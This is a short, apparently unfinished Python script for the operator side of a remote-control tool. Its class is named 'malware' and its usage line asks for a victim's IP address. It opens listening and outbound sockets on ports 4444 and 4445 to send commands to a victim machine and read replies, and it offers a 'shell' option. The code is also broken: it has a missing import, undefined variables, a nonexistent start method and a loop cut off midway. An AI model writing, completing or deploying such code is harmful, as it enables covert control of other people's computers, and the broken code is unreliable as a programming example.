import threading
import time
import socket
import random

IN_PORT = 4444
OUT_PORT = 4445


def print_help():
    print('Usage : python3 control.py <victim_IP_address>')


class InThread(threading.Thread):
    def __init__(self):
        super().__init__()

    def run(self):
        s = socket.socket()  # Par défaut, construit un socket TCP
        s.bind(('', IN_PORT))
        s.listen(1)  # Nb connexions max entre parenthèses

        conn, addr = s.accept()  # Renvoie une connexion et l'adresse (Port + IP)

        again = True
        while again:
            msg = conn.recv(1024).decode('UTF-8')  # Taille de buffer entre parenthèses
            if msg == 'exit':
                again = False
            else:
                print(msg)

        s.close()


class OutThread(threading.Thread):
    def __init__(self, ip):
        super().__init__()
        self.ip = ip

    def run(self):
        s = socket.socket()

        s.connect((self.ip, OUT_PORT))

        again = True
        while again:
            msg = input()
            if msg == 'exit':
                again = False

            s.sendall(msg.encode('UTF-8'))

        s.close()


class malware():
    def __init__(self, ip, out_port=OUT_PORT, in_port=IN_PORT):
        self.ip = ip
        self.out_port = out_port
        self.in_port = in_port

    def run(self):
        print("Trying to reach {} on port {}".format(self.ip, self.out_port))
        self.prod = InThread(self.in_port)
        self.cons = OutThread(self.ip, self.out_port)
        self.prod.start()
        self.cons.start()

    def stop(self):
        self.prod.stop()
        self.cons.stop()


if sys.argv == 1:
    ipaddr = sys.argv[1]
    malw = malware(ip)
    malw.start()
else:
    print_help()

if cons.isAlive() and prod.isAlive():
    list = ['info', 'shell']

    end = False
    while not end:
        cmd = input('{} > '.format(ipaddr))


